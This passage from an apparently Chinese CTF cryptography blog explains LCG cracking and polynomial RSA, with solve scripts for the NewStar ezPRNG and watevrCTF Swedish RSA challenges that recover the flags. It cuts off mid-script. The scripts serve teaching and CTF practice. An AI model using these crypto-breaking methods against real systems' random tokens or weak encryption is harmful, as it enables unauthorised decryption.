Dawn_whisper")</span><br><span class="line">        diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]</span><br><span class="line">        zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]</span><br><span class="line">        modulus = abs(reduce(gcd, zeroes))</span><br><span class="line">        return self.lcgattack2(states, modulus)</span><br><span class="line"></span><br><span class="line">'''</span><br><span class="line">以下是样例执行。</span><br><span class="line">'''</span><br><span class="line"></span><br><span class="line">test = lcg_attack()</span><br><span class="line"></span><br><span class="line">state = [150532854791355748039117763516755705063,</span><br><span class="line">335246949167877025932432065299887980427,</span><br><span class="line">186623163520020374273300614035532913241,</span><br><span class="line">215621842477244010690624570814660992556,</span><br><span class="line">220694532805562822940506614120520015819,</span><br><span class="line">17868778653481346517880312348382129728,</span><br><span class="line">160572327041397126918110376968541265339]</span><br><span class="line"></span><br><span class="line">print(test.lcgattack3(state))</span><br><span class="line"></span><br><span class="line">作者: Dawn_whisper</span><br><span class="line">链接: https://dawnwhisper.github.io/2021/03/04/LCG/</span><br><span class="line">来源: Dawn_whisper's blog</span><br><span class="line">著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。</span><br></pre></td></tr></table></figure><p>6个状态值也可能求出来，遇到求逆问题的可能需要变换crack_unknown_multiplier中state相减。</p><p>example-two:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#NewStar 2022 ezPRNG wp:</span><br><span class="line">def egcd(a, b):</span><br><span class="line">    if a == 0:</span><br><span class="line">        return (b, 0, 1)</span><br><span class="line">    else:</span><br><span class="line">        g, y, x = egcd(b % a, a)</span><br><span class="line">        return (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, y = egcd(a, m)</span><br><span class="line">    if g != 1:</span><br><span class="line">        raise Exception('modular inverse does not exist')</span><br><span class="line">    else:</span><br><span class="line">        return x % m</span><br><span class="line"></span><br><span class="line">def crack_unknown_increment(states, modulus, multiplier):</span><br><span class="line">    increment = (states[1] - states[0]*multiplier) % modulus</span><br><span class="line">    return modulus, multiplier, increment</span><br><span class="line"></span><br><span class="line">def crack_unknown_multiplier(states, modulus):</span><br><span class="line">    multiplier = (states[3] - states[2]) * modinv(states[2] - states[1], modulus) % modulus</span><br><span class="line">    return crack_unknown_increment(states, modulus, multiplier)</span><br><span class="line"></span><br><span class="line">def crack_unknown_modulus(states):</span><br><span class="line">    diffs = [s1 - s0 for s0, s1 in zip(states, states[1:])]</span><br><span class="line">    zeroes = [t2*t0 - t1*t1 for t0, t1, t2 in zip(diffs, diffs[1:], diffs[2:])]</span><br><span class="line">    modulus = abs(reduce(gcd, zeroes))</span><br><span class="line">    print(modulus)</span><br><span class="line">    return crack_unknown_multiplier(states, modulus)</span><br><span class="line"></span><br><span class="line"># N[i+1] = (A*N[i]+B) % M</span><br><span class="line"># A,B,N均未知</span><br><span class="line">hints = [32579077549265101609729134002322479188058664203229584246639330306875565342934, 30627296760863751873213598737521260410801961411772904859782399797798775242121, 59045755507520598673072877669036271379314362490837080079400207813316110037822, 29714794521560972198312794885289362350476307292503308718904661896314434077717, 3378007627369454232183998646610752441039379051735310926898417029172995488622, 35893579613746468714922176435597562302206699188445795487657524606666534642489]</span><br><span class="line"></span><br><span class="line">sequence = hints</span><br><span class="line">modulus, multiplier, increment = crack_unknown_modulus(sequence)</span><br><span class="line">print('A = '+str(multiplier))</span><br><span class="line">print('B = '+str(increment))</span><br><span class="line">print('N = '+str(modulus))</span><br><span class="line">print(crack_unknown_modulus(hints))</span><br><span class="line"></span><br><span class="line">A = 6665518583654864024281280175260135044707462922029971254176205214742119570627</span><br><span class="line">B = 70647661941803021648890247705354664245937054339520114852905142734885854842787</span><br><span class="line">N = 121345174246418575181911383111384744844396268276674523949961216790284235179004</span><br><span class="line"></span><br><span class="line">e = inverse(A, N)</span><br><span class="line">print(GCD(A,N))</span><br><span class="line">print(e)</span><br><span class="line">flag = ((hints[0] - B) * e) % N</span><br><span class="line">print(long_to_bytes(flag))</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;&lt;a href=&quot;https://dawnwhisper.github.io/2021/03/04/LCG/&quot;&gt;Dawn_whisper : LCG&lt;/a&gt;&lt;/p&gt;
&lt;h3&gt;&lt;span id=&quot;1-线性同余生成方法&quot;&gt;1、线性同余生成方法&lt;/span&gt;&lt;/h3&gt;
&lt;p&gt;</summary>
      
    
    
    
    <category term="Crypto" scheme="https://feverhu.github.io/categories/Crypto/"/>
    
    
    <category term="LCG" scheme="https://feverhu.github.io/tags/LCG/"/>
    
  </entry>
  
  <entry>
    <title>多项式RSA</title>
    <link href="https://feverhu.github.io/2022/09/03/%E5%A4%9A%E9%A1%B9%E5%BC%8FRSA-NTRU/"/>
    <id>https://feverhu.github.io/2022/09/03/%E5%A4%9A%E9%A1%B9%E5%BC%8FRSA-NTRU/</id>
    <published>2022-09-02T16:08:24.000Z</published>
    <updated>2022-12-07T02:09:39.133Z</updated>
    
    <content type="html"><![CDATA[<h1><span id="多项式rsa">多项式RSA</span></h1><h2><span id="整数rsa加解密原理">整数RSA加解密原理</span></h2><p> <img src="2022-09-02-23-43-40.png" alt></p><h2><span id="多项式rsa推倒">多项式RSA推倒</span></h2><p>在上面RSA原理的基础上将多项式的代入整数进行分析。<br><img src="2022-09-02-23-47-39.png" alt></p><p>引用：<a href="https://xz.aliyun.com/t/4545">以上原理、推导</a></p><h2><span id="phi的问题">phi的问题</span></h2><p>不可约多项式的欧拉函数求法：回到欧拉函数定义本身，欧拉函数是小于或等于n的正整数中与n互素的数的数目。</p><p>再看不可约多项式p(x)，除了0，长度为n每一个多项式都与p(x)互素，因此</p><script type="math/tex; mode=display">\phi(g(x)) = p^n-1</script><h2><span id="明文与多项式系数">明文与多项式系数</span></h2><p><strong>加密：</strong> 将明文每个字符转ascii，每一位对应一项多项式的系数。<br><strong>解密：</strong> 将每一位多项式系数转换为ascii，连起来就是原文。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">m = pow(c, d, N) </span><br><span class="line">m = "".join([chr(c) for c in m.list()])</span><br></pre></td></tr></table></figure><h3><span id="例题watevrctf-2019swedish-rsa">例题：[watevrCTF 2019]Swedish RSA</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">flag = bytearray(raw_input())</span><br><span class="line">flag = list(flag)</span><br><span class="line">length = len(flag)</span><br><span class="line">bits = 16</span><br><span class="line"></span><br><span class="line">## Prime for Finite Field.</span><br><span class="line">p = random_prime(2^bits-1, False, 2^(bits-1))</span><br><span class="line"></span><br><span class="line">file_out = open("downloads/polynomial_rsa.txt", "w")</span><br><span class="line">file_out.write("Prime: " + str(p) + "\n")</span><br><span class="line"></span><br><span class="line">## Univariate Polynomial Ring in y over Finite Field of size p</span><br><span class="line">R.&lt;y&gt; = PolynomialRing(GF(p))</span><br><span class="line"></span><br><span class="line">## Analogous to the primes in Z</span><br><span class="line">def gen_irreducable_poly(deg):</span><br><span class="line">    while True:</span><br><span class="line">        out = R.random_element(degree=deg)</span><br><span class="line">        if out.is_irreducible():</span><br><span class="line">            return out</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## Polynomial "primes"</span><br><span class="line">P = gen_irreducable_poly(ZZ.random_element(length, 2*length))</span><br><span class="line">Q = gen_irreducable_poly(ZZ.random_element(length, 2*length))</span><br><span class="line"></span><br><span class="line">## Public exponent key</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line">## Modulus</span><br><span class="line">N = P*Q</span><br><span class="line">file_out.write("Modulus: " + str(N) + "\n")</span><br><span class="line"></span><br><span class="line">## Univariate Quotient Polynomial Ring in x over Finite Field of size 659 with modulus N(x)</span><br><span class="line">S.&lt;x&gt; = R.quotient(N)</span><br><span class="line"></span><br><span class="line">## Encrypt</span><br><span class="line">m = S(flag)</span><br><span class="line">c = m^e</span><br><span class="line"></span><br><span class="line">file_out.write("Ciphertext: " + str(c))</span><br><span class="line">file_out.close()</span><br><span class="line"></span><br><span class="line">'''</span><br><span class="line">Prime: 43753</span><br><span class="line">Modulus: 34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814</span><br><span class="line">Ciphertext: 5209*x^176 + 10881*x^175 + 31096*x^174 + 23354*x^173 + 28337*x^172 + 15982*x^171 + 13515*x^170 + 21641*x^169 + 10254*x^168 + 34588*x^167 + 27434*x^166 + 29552*x^165 + 7105*x^164 + 22604*x^163 + 41253*x^162 + 42675*x^161 + 21153*x^160 + 32838*x^159 + 34391*x^158 + 832*x^157 + 720*x^156 + 22883*x^155 + 19236*x^154 + 33772*x^153 + 5020*x^152 + 17943*x^151 + 26967*x^150 + 30847*x^149 + 10306*x^148 + 33966*x^147 + 43255*x^146 + 20342*x^145 + 4474*x^144 + 3490*x^143 + 38033*x^142 + 11224*x^141 + 30565*x^140 + 31967*x^139 + 32382*x^138 + 9759*x^137 + 1030*x^136 + 32122*x^135 + 42614*x^134 + 14280*x^133 + 16533*x^132 + 32676*x^131 + 43070*x^130 + 36009*x^129 + 28497*x^128 + 2940*x^127 + 9747*x^126 + 22758*x^125 + 16615*x^124 + 14086*x^123 + 13038*x^122 + 39603*x^121 + 36260*x^120 + 32502*x^119 + 17619*x^118 + 17700*x^117 + 15083*x^116 + 11311*x^115 + 36496*x^114 + 1300*x^113 + 13601*x^112 + 43425*x^111 + 10376*x^110 + 11551*x^109 + 13684*x^108 + 14955*x^107 + 6661*x^106 + 12674*x^105 + 21534*x^104 + 32132*x^103 + 34135*x^102 + 43684*x^101 + 837*x^100 + 29311*x^99 + 4849*x^98 + 26632*x^97 + 26662*x^96 + 10159*x^95 + 32657*x^94 + 12149*x^93 + 17858*x^92 + 35805*x^91 + 19391*x^90 + 30884*x^89 + 42039*x^88 + 17292*x^87 + 4694*x^86 + 1497*x^85 + 1744*x^84 + 31071*x^83 + 26246*x^82 + 24402*x^81 + 22068*x^80 + 39263*x^79 + 23703*x^78 + 21484*x^77 + 12241*x^76 + 28821*x^75 + 32886*x^74 + 43075*x^73 + 35741*x^72 + 19936*x^71 + 37219*x^70 + 33411*x^69 + 8301*x^68 + 12949*x^67 + 28611*x^66 + 42654*x^65 + 6910*x^64 + 18523*x^63 + 31144*x^62 + 21398*x^61 + 36298*x^60 + 27158*x^59 + 918*x^58 + 38601*x^57 + 4269*x^56 + 5699*x^55 + 36444*x^54 + 34791*x^53 + 37978*x^52 + 32481*x^51 + 8039*x^50 + 11012*x^49 + 11454*x^48 + 30450*x^47 + 1381*x^46 + 32403*x^45 + 8202*x^44 + 8404*x^43 + 37648*x^42 + 43696*x^41 + 34237*x^40 + 36490*x^39 + 41423*x^38 + 35792*x^37 + 36950*x^36 + 31086*x^35 + 38970*x^34 + 12439*x^33 + 7963*x^32 + 16150*x^31 + 11382*x^30 + 3038*x^29 + 20157*x^28 + 23531*x^27 + 32866*x^26 + 5428*x^25 + 21132*x^24 + 13443*x^23 + 28909*x^22 + 42716*x^21 + 6567*x^20 + 24744*x^19 + 8727*x^18 + 14895*x^17 + 28172*x^16 + 30903*x^15 + 26608*x^14 + 27314*x^13 + 42224*x^12 + 42551*x^11 + 37726*x^10 + 11203*x^9 + 36816*x^8 + 5537*x^7 + 20301*x^6 + 17591*x^5 + 41279*x^4 + 7999*x^3 + 33753*x^2 + 34551*x + 9659</span><br><span class="line">'''</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3><span id="expsage">exp.sage:</span></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">R.&lt;y&gt; = PolynomialRing(GF(43753))</span><br><span class="line">N = R("34036*y^177 + 23068*y^176 + 13147*y^175 + 36344*y^174 + 10045*y^173 + 41049*y^172 + 17786*y^171 + 16601*y^170 + 7929*y^169 + 37570*y^168 + 990*y^167 + 9622*y^166 + 39273*y^165 + 35284*y^164 + 15632*y^163 + 18850*y^162 + 8800*y^161 + 33148*y^160 + 12147*y^159 + 40487*y^158 + 6407*y^157 + 34111*y^156 + 8446*y^155 + 21908*y^154 + 16812*y^153 + 40624*y^152 + 43506*y^151 + 39116*y^150 + 33011*y^149 + 23914*y^148 + 2210*y^147 + 23196*y^146 + 43359*y^145 + 34455*y^144 + 17684*y^143 + 25262*y^142 + 982*y^141 + 24015*y^140 + 27968*y^139 + 37463*y^138 + 10667*y^137 + 39519*y^136 + 31176*y^135 + 27520*y^134 + 32118*y^133 + 8333*y^132 + 38945*y^131 + 34713*y^130 + 1107*y^129 + 43604*y^128 + 4433*y^127 + 18110*y^126 + 17658*y^125 + 32354*y^124 + 3219*y^123 + 40238*y^122 + 10439*y^121 + 3669*y^120 + 8713*y^119 + 21027*y^118 + 29480*y^117 + 5477*y^116 + 24332*y^115 + 43480*y^114 + 33406*y^113 + 43121*y^112 + 1114*y^111 + 17198*y^110 + 22829*y^109 + 24424*y^108 + 16523*y^107 + 20424*y^106 + 36206*y^105 + 41849*y^104 + 3584*y^103 + 26500*y^102 + 31897*y^101 + 34640*y^100 + 27449*y^99 + 30962*y^98 + 41434*y^97 + 22125*y^96 + 24314*y^95 + 3944*y^94 + 18400*y^93 + 38476*y^92 + 28904*y^91 + 27936*y^90 + 41867*y^89 + 25573*y^88 + 25659*y^87 + 33443*y^86 + 18435*y^85 + 5934*y^84 + 38030*y^83 + 17563*y^82 + 24086*y^81 + 36782*y^80 + 20922*y^79 + 38933*y^78 + 23448*y^77 + 10599*y^76 + 7156*y^75 + 29044*y^74 + 23605*y^73 + 7657*y^72 + 28200*y^71 + 2431*y^70 + 3860*y^69 + 23259*y^68 + 14590*y^67 + 33631*y^66 + 15673*y^65 + 36049*y^64 + 29728*y^63 + 22413*y^62 + 18602*y^61 + 18557*y^60 + 23505*y^59 + 17642*y^58 + 12595*y^57 + 17255*y^56 + 15316*y^55 + 8948*y^54 + 38*y^53 + 40329*y^52 + 9823*y^51 + 5798*y^50 + 6379*y^49 + 8662*y^48 + 34640*y^47 + 38321*y^46 + 18760*y^45 + 13135*y^44 + 15926*y^43 + 34952*y^42 + 28940*y^41 + 13558*y^40 + 42579*y^39 + 38015*y^38 + 33788*y^37 + 12381*y^36 + 195*y^35 + 13709*y^34 + 31500*y^33 + 32994*y^32 + 30486*y^31 + 40414*y^30 + 2578*y^29 + 30525*y^28 + 43067*y^27 + 6195*y^26 + 36288*y^25 + 23236*y^24 + 21493*y^23 + 15808*y^22 + 34500*y^21 + 6390*y^20 + 42994*y^19 + 42151*y^18 + 19248*y^17 + 19291*y^16 + 8124*y^15 + 40161*y^14 + 24726*y^13 + 31874*y^12 + 30272*y^11 + 30761*y^10 + 2296*y^9 + 11017*y^8 + 16559*y^7 + 28949*y^6 + 40499*y^5 + 22377*y^4 + 33628*y^3 + 30598*y^2 + 4386*y + 23814")</span><br><span class="line">print(factor(N))</span><br><span class="line"></span><br><span class="line">e = 65537</span><br><span class="line">phi = (43753^65-1)*(43753^112-1)</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line"></span><br><span class="line">C = R("5209*y^176 + 10881*y^175 + 31096*y^174 + 23354*y^173 + 28337*y^172 + 15982*y^171 + 13515*y^170 + 21641*y^169 + 10254*y^168 + 34588*y^167 + 27434*y^166 + 29552*y^165 + 7105*y^164 + 22604*y^163 + 41253*y^162 + 42675*y^161 + 21153*y^160 + 32838*y^159 + 34391*y^158 + 832*y^157 + 720*y^156 + 22883*y^155 + 19236*y^154 + 33772*y^153 + 5020*y^152 + 17943*y^151 + 26967*y^150 + 30847*y^149 + 10306*y^148 + 33966*y^147 + 43255*y^146 + 20342*y^145 + 4474*y^144 + 3490*y^143 + 38033*y^142 + 11224*y^141 + 30565*y^140 + 31967*y^139 + 32382*y^138 + 9759*y^137 + 1030*y^136 + 32122*y^135 + 42614*y^134 + 14280*y^133 + 16533*y^132 + 32676*y^131 + 43070*y^130 + 36009*y^129 + 28497*y^128 + 2940*y^127 + 9747*y^126 + 22758*y^125 + 16615*y^124 + 14086*y^123 + 13038*y^122 + 39603*y^121 + 36260*y^120 + 32502*y^119 + 17619*y^118 + 17700*y^117 + 15083*y^116 + 11311*y^115 + 36496*y^114 + 1300*y^113 + 13601*y^112 + 43425*y^111 + 10376*y^110 + 11551*y^109 + 13684*y^108 + 14955*y^107 + 6661*y^106 + 12674*y^105 + 21534*y^104 + 32132*y^103 + 34135*y^102 + 43684*y^101 + 837*y^100 + 29311*y^99 + 4849*y^98 + 26632*y^97 + 26662*y^96 + 10159*y^95 + 32657*y^94 + 12149*y^93 + 17858*y^92 + 35805*y^91 + 19391*y^90 + 30884*y^89 + 42039*y^88 + 17292*y^87 + 4694*y^86 + 1497*y^85 + 1744*y^84 + 31071*y^83 + 26246*y^82 + 24402*y^81 + 22068*y^80 + 39263*y^79 + 23703*y^78 + 21484*y^77 + 12241*y^76 + 28821*y^75 + 32886*y^74 + 43075*y^73 + 35741*y^72 + 19936*y^71 + 37219*y^70 + 33411*y^69 + 8301*y^68 + 12949*y^67 + 28611*y^66 + 42654*y^65 + 6910*y^64 + 18523*y^63 + 31144*y^62 + 21398*y^61 + 36298*y^60 + 27158*y^59 + 918*y^58 + 38601*y^57 + 4269*y^56 + 5699*y^55 + 36444*y^54 + 34791*y^53 + 37978*y^52 + 32481*y^51 + 8039*y^50 + 11012*y^49 + 11454*y^48 + 30450*y^47 + 1381*y^46 + 32403*y^45 + 8202*y^44 + 8404*y^43 + 37648*y^42 + 43696*y^41 + 34237*y^40 + 36490*y^39 + 41423*y^38 + 35792*y^37 + 36950*y^36 + 31086*y^35 + 38970*y^34 + 12439*y^33 + 7963*y^32 + 16150*y^31 + 11382*y^30 + 3038*y^29 + 20157*y^28 + 23531*y^27 + 32866*y^26 + 5428*y^25 + 21132*y^24 + 13443*y^23 + 28909*y^22 + 42716*y^21 + 6567*y^20 + 24744*y^19 + 8727*y^18 + 14895*y^17 + 28172*y^16 + 30903*y^15 + 26608*y^14 + 27314*y^13 + 42224*y^12 + 42551*y^11 + 37726*y^10 + 11203*y^9 + 36816*y^8 + 5537*y^7 + 20301*y^6 + 17591*y^5 + 41279*y^4 + 7999*y^3 + 33753*y^2 + 34551*y + 9659")</span><br><span class="line"></span><br><span class="line">m = pow(C, d, N)</span><br><span class="line">m = "".join([chr(c) for c in m.list()])</span><br><span class="line"></span><br><span class="line">print(m)</span><br><span class="line"></span><br><span class="line">#watevr{RSA_from_ikea_is_fun_but_insecure#k20944uehdjfnjd335uro}</span><br><span class="line">#flag{RSA_from_ikea_is_fun_but_insecure#k20944uehdjfnjd335uro}</span><br></pre></td></tr></table></figure><p>另一篇很好的讲解：<a href="https://4xwi11.github.io/posts/a0a0f5aa/">多项式RSA</a><br>exp.sage:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env sage</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">p = 43753</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(GF(p))</span><br><span class="line"></span><br><span class="line">N = 34036*x^177 + 23068*x^176 + 13147*x^175 + 36344*x^174 + 10045*x^173 + 41049*x^172 + 17786*x^171 + 16601*x^170 + 7929*x^169 + 37570*x^168 + 990*x^167 + 9622*x^166 + 39273*x^165 + 35284*x^164 + 15632*x^163 + 18850*x^162 + 8800*x^161 + 33148*x^160 + 12147*x^159 + 40487*x^158 + 6407*x^157 + 34111*x^156 + 8446*x^155 + 21908*x^154 + 16812*x^153 + 40624*x^152 + 43506*x^151 + 39116*x^150 + 33011*x^149 + 23914*x^148 + 2210*x^147 + 23196*x^146 + 43359*x^145 + 34455*x^144 + 17684*x^143 + 25262*x^142 + 982*x^141 + 24015*x^140 + 27968*x^139 + 37463*x^138 + 10667*x^137 + 39519*x^136 + 31176*x^135 + 27520*x^134 + 32118*x^133 + 8333*x^132 + 38945*x^131 + 34713*x^130 + 1107*x^129 + 43604*x^128 + 4433*x^127 + 18110*x^126 + 17658*x^125 + 32354*x^124 + 3219*x^123 + 40238*x^122 + 10439*x^121 + 3669*x^120 + 8713*x^119 + 21027*x^118 + 29480*x^117 + 5477*x^116 + 24332*x^115 + 43480*x^114 + 33406*x^113 + 43121*x^112 + 1114*x^111 + 17198*x^110 + 22829*x^109 + 24424*x^108 + 16523*x^107 + 20424*x^106 + 36206*x^105 + 41849*x^104 + 3584*x^103 + 26500*x^102 + 31897*x^101 + 34640*x^100 + 27449*x^99 + 30962*x^98 + 41434*x^97 + 22125*x^96 + 24314*x^95 + 3944*x^94 + 18400*x^93 + 38476*x^92 + 28904*x^91 + 27936*x^90 + 41867*x^89 + 25573*x^88 + 25659*x^87 + 33443*x^86 + 18435*x^85 + 5934*x^84 + 38030*x^83 + 17563*x^82 + 24086*x^81 + 36782*x^80 + 20922*x^79 + 38933*x^78 + 23448*x^77 + 10599*x^76 + 7156*x^75 + 29044*x^74 + 23605*x^73 + 7657*x^72 + 28200*x^71 + 2431*x^70 + 3860*x^69 + 23259*x^68 + 14590*x^67 + 33631*x^66 + 15673*x^65 + 36049*x^64 + 29728*x^63 + 22413*x^62 + 18602*x^61 + 18557*x^60 + 23505*x^59 + 17642*x^58 + 12595*x^57 + 17255*x^56 + 15316*x^55 + 8948*x^54 + 38*x^53 + 40329*x^52 + 9823*x^51 + 5798*x^50 + 6379*x^49 + 8662*x^48 + 34640*x^47 + 38321*x^46 + 18760*x^45 + 13135*x^44 + 15926*x^43 + 34952*x^42 + 28940*x^41 + 13558*x^40 + 42579*x^39 + 38015*x^38 + 33788*x^37 + 12381*x^36 + 195*x^35 + 13709*x^34 + 31500*x^33 + 32994*x^32 + 30486*x^31 + 40414*x^30 + 2578*x^29 + 30525*x^28 + 43067*x^27 + 6195*x^26 + 36288*x^25 + 23236*x^24 + 21493*x^23 + 15808*x^22 + 34500*x^21 + 6390*x^20 + 42994*x^19 + 42151*x^18 + 19248*x^17 + 19291*x^16 + 8124*x^15 + 40161*x^14 + 24726*x^13 + 31874*x^12 + 30272*x^11 + 30761*x^10 + 2296*x^9 + 11017*x^8 + 16559*x^7 + 28949*x^6 + 40499*x^5 + 22377*x^4 + 33628*x^3 + 30598*x^2 + 4386*x + 23814</span><br><span class="line">c = 5209*x^176 + 10881*x^175 + 31096*x^174 + 23354*x^173 + 28337*x^172 + 15982*x^171 + 13515*x^170 + 21641*x^169 + 10254*x^168 + 34588*x^167 + 27434*x^166 + 29552*x^165 + 7105*x^164 + 22604*x^163 + 41253*x^162 + 42675*x^161 + 21153*x^160 + 32838*x^159 + 34391*x^158 + 832*x^157 + 720*x^156 + 22883*x^155 + 19236*x^154 + 33772*x^153 + 5020*x^152 + 17943*x^151 + 26967*x^150 + 30847*x^149 + 10306*x^148 + 33966*x^147 + 43255*x^146 + 20342*x^145 + 4474*x^144 + 3490*x^143 + 38033*x^142 + 11224*x^141 + 30565*x^140 + 31967*x^139 + 32382*x^138 + 9759*x^137 + 1030*x^136 + 32122*x^135 + 42614*x^134 + 14280*x^133 + 16533*x^132 + 32676*x^131 + 43070*x^130 + 36009*x^129 + 28497*x^128 + 2940*x^127 + 9747*x^126 + 22758*x^125 + 16615*x^124 + 14086*x^123 + 13038*x^122 + 39603*x^121 + 36260*x^120 + 32502*x^119 + 17619*x^118 + 17700*x^117 + 15083*x^116 + 11311*x^115 + 36496*x^114 + 1300*x^113 + 13601*x^112 + 43425*x^111 + 10376*x^110 + 11551*x^109 + 13684*x^108 + 14955*x^107 + 6661*x^106 + 12674*x^105 + 21534*x^104 + 